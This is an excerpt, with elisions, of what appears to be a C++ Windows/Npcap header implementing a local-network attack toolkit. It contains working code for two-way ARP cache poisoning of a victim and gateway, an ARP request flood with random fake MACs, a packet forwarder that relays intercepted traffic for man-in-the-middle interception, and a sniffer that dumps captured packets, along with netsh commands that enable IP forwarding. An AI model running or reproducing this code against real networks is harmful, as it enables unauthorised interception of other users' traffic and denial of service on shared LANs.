...
BuildArpPacket(const uint8_t *EthDst, const uint8_t *EthSrc, uint16_t ArpOper,
               const uint8_t *ArpSha, uint32_t ArpSpa, const uint8_t *ArpTha,
               uint32_t ArpTpa) {
  EthArpPacket Pkt = {};
...
inline int SendArp(pcap_t *Handle, const std::vector<uint8_t> &Packet) {
  return pcap_sendpacket(Handle, Packet.data(),
...
inline void MacStrToBytes(const std::string &MacStr, uint8_t Out[6]) {
  unsigned int M[6];
  if (sscanf_s(MacStr.c_str(), "%x:%x:%x:%x:%x:%x", &M[0], &M[1], &M[2], &M[3],
               &M[4], &M[5]) == 6) {
    for (int I = 0; I < 6; I++)
...
inline bool IsVirtualIfName(const std::string &Name) {
  static const char *Keywords[] = {
      "VMware",  "VirtualBox", "Hyper-V", "VPN",       "Tunnel",
      "Virtual", "virtio",     "Wintun",  "vmnet",     "vboxnet",
      "docker",  "veth",       "virbr",   "WireGuard", "Bluetooth",
...
inline std::vector<NetInterface> GetInterfaces() {
    ...
    AllDevs = nullptr;
  {
    ...
    fprintf(
        stderr,
        "[ARP DEBUG] GetAdaptersInfo ret=%lu  Npcap devices=%d  ErrBuf=%s\n",
  ...
  for (PIP_ADAPTER_INFO P = PInfo; P != nullptr; P = P->Next) {
    ...
    char Mac[18];
    snprintf(Mac, sizeof(Mac), "%02X:%02X:%02X:%02X:%02X:%02X", P->Address[0],
             P->Address[1], P->Address[2], P->Address[3], P->Address[4],
             P->Address[5]);
    Iface.MacAddr = Mac;
    ...
    if (Iface.DevName.empty() && AllDevs) {
      ...
      for (pcap_if_t *D2 = AllDevs; D2 != nullptr; D2 = D2->next) {
        ...
        if (!AdapterName.empty() &&
            Dname.find(AdapterName) != std::string::npos) {
      ...
      if (Iface.DevName.empty())
        Iface.DevName = AllDevs->name;
    }
    if (!Iface.IpAddr.empty() && Iface.IpAddr != "0.0.0.0")
      Result.push_back(Iface);
  }
  fprintf(stderr,
          "[ARP DEBUG] ===== GetInterfaces: %zu adapter(s) returned =====\n",
          Result.size());
  for (size_t I = 0; I < Result.size(); I++) {
    const auto &N = Result[I];
    fprintf(stderr, "[ARP DEBUG] #%zu: \"%s\"\n", I, N.Friendly.c_str());
    fprintf(stderr, "          IP=%s  MAC=%s  GW=%s\n", N.IpAddr.c_str(),
            N.MacAddr.c_str(), N.Gateway.c_str());
...
inline bool EnableIpForward(uint32_t IfIndex) {
  ...
  snprintf(Cmd, sizeof(Cmd),
           "netsh interface ipv4 set interface %lu forwarding=enabled",
           IfIndex);
  STARTUPINFOA Si{};
...
inline bool DisableIpForward(uint32_t IfIndex) {
  char Cmd[128];
  snprintf(Cmd, sizeof(Cmd),
           "netsh interface ipv4 set interface %lu forwarding=disabled",
           IfIndex);
  STARTUPINFOA Si{};
  PROCESS_INFORMATION Pi{};
  Si.cb = sizeof(Si);
...
inline bool GetIpForwardStatus(uint32_t IfIndex) {
  ...
  snprintf(Cmd, sizeof(Cmd), "netsh interface ipv4 show interface %lu",
           IfIndex);
  FILE *P = _popen(Cmd, "r");
  if (!P)
    return false;
...
inline NetInterface FindBestInterface() {
  ...
  for (const auto &I : Ifaces) {
    if (!I.IsVirtual && I.IsUp && I.IsConnected && I.HasGateway &&
        !I.IsLoopback) {
  ...
  fprintf(
      stderr,
      "[ARP DEBUG] Pri5: no match - falling back (Npcap flags unreliable)\n");
  for (const auto &I : Ifaces) {
  ...
  fprintf(stderr,
          "[ARP DEBUG] ALL PRIORITIES FAILED - no suitable interface!\n");
  return {};
}
...
inline NetInterface SelectInterface(const std::string &DevName) {
  if (!DevName.empty()) {
    ...
    for (const auto &Iface : Ifaces) {
      if (Iface.DevName == DevName ||
          Iface.Friendly.find(DevName) != std::string::npos)
        return Iface;
    }
    return {};
  }
...
inline bool ResolveMac(pcap_t *Handle, const uint8_t *SrcMac,
                       const std::string &SrcIp, const std::string &TargetIp,
                       uint8_t OutMac[6], int TimeoutMs = 3000) {
  uint32_t TargetU32 = IpToU32(TargetIp);
  uint32_t SrcU32 = IpToU32(SrcIp);
  auto ArpReq = BuildArpPacket(BroadcastMac, SrcMac, ArpRequest, SrcMac, SrcU32,
                               nullptr, TargetU32);
  if (pcap_sendpacket(Handle, ArpReq.data(), static_cast<int>(ArpReq.size())) !=
      0)
    return false;
  ...
  void restore(int Count = 5) {
    for (int I = 0; I < Count; I++) {
      ...
      auto P2 = BuildArpPacket(Params.GatewayMac, Params.VictimMac, ArpReply,
                               Params.VictimMac, Params.VictimIp,
                               Params.GatewayMac, Params.GatewayIp);
      SendArp(Params.Handle, P1);
      SendArp(Params.Handle, P2);
...
private:
  ...
  void SendSpoofPackets() {
    auto P1 =
        BuildArpPacket(Params.VictimMac, Params.MyMac, ArpReply, Params.MyMac,
                       Params.GatewayIp, Params.VictimMac, Params.VictimIp);
    auto P2 =
        BuildArpPacket(Params.GatewayMac, Params.MyMac, ArpReply, Params.MyMac,
                       Params.VictimIp, Params.GatewayMac, Params.GatewayIp);
    SendArp(Params.Handle, P1);
    SendArp(Params.Handle, P2);
  }
  SpoofParams Params;
...
private:
  void RunLoop() {
    ...
    while (Running) {
      uint8_t FakeMac[6];
      for (int I = 0; I < 6; I++)
        FakeMac[I] = static_cast<uint8_t>(MacByte(Gen));
      ...
      auto Pkt = BuildArpPacket(BroadcastMac, FakeMac, ArpRequest, FakeMac,
                                FakeIp, nullptr, TargetIp);
      SendArp(Params.Handle, Pkt);
      Sent++;
      ...
      if (Elapsed < Expected)
        std::this_thread::sleep_for(
            std::chrono::nanoseconds(Expected - Elapsed));
    }
  }
  FloodParams Params;
  std::atomic<bool> Running{false};
...
public:
  ...
  void start() {
    ...
    Running = true;
    std::thread([this]() {
      pcap_loop(Params.Handle, -1, PacketHandler,
...
private:
  static void PacketHandler(uint8_t *User, const struct pcap_pkthdr *Header,
                            const uint8_t *Pkt) {
    PacketForwarder *Self = reinterpret_cast<PacketForwarder *>(User);
    if (!Self->IsRunning()) {
      pcap_breakloop(Self->Params.Handle);
      return;
    }
    if (Header->len < 14)
      return;
    ...
    if (ET != EthertypeIp)
      return;
    if (memcmp(Pkt, Self->Params.MyMac, 6) != 0)
      return;
    const uint8_t *IpHdr = Pkt + 14;
    if ((IpHdr[0] >> 4) != 4)
      return;
    uint32_t DstIp =
        (IpHdr[16] << 24) | (IpHdr[17] << 16) | (IpHdr[18] << 8) | IpHdr[19];
    const uint8_t *NewDst = nullptr;
    if (DstIp == Self->Params.GatewayIp)
      NewDst = Self->Params.GatewayMac;
    else if (DstIp == Self->Params.VictimIp)
      NewDst = Self->Params.VictimMac;
    else
      return;
    uint16_t TotalLen = (IpHdr[2] << 8) | IpHdr[3];
    int FrameLen = TotalLen + 14;
    if (FrameLen > Header->len)
      FrameLen = static_cast<int>(Header->len);
    if (FrameLen > 1514)
      FrameLen = 1514;
...
public:
  ...
  void start() {
    ...
    if (!Params.Filter.empty()) {
      ...
      bpf_u_int32 Net = 0;
      if (pcap_compile(Params.Handle, &Fp, Params.Filter.c_str(), 0, Net) ==
          0) {
        pcap_setfilter(Params.Handle, &Fp);
        pcap_freecode(&Fp);
      }
    }
    Running = true;
    std::thread([this]() {
      pcap_loop(Params.Handle, -1, SniffCallback,
                reinterpret_cast<uint8_t *>(this));
      Running = false;
    }).detach();
  }
  ...
  void DumpPkt(const struct pcap_pkthdr *H, const uint8_t *Pkt) {
    if (Dumper)
      pcap_dump(reinterpret_cast<uint8_t *>(Dumper), H, Pkt);
  }
...
private:
  static void SniffCallback(uint8_t *User, const struct pcap_pkthdr *Header,
                            const uint8_t *Pkt) {
    ...
    uint32_t SrcIp =
        (IpHdr[12] << 24) | (IpHdr[13] << 16) | (IpHdr[14] << 8) | IpHdr[15];
    uint32_t DstIp =
        (IpHdr[16] << 24) | (IpHdr[17] << 16) | (IpHdr[18] << 8) | IpHdr[19];
    char Ts[32];
    ...
    if (Proto == 6) {
      Pn = "TCP";
      if (Header->len >= (size_t)(14 + Ihl + 4)) {
        const uint8_t *T = IpHdr + Ihl;
        Sp = (T[0] << 8) | T[1];
        Dp = (T[2] << 8) | T[3];
      }
    } else if (Proto == 17) {
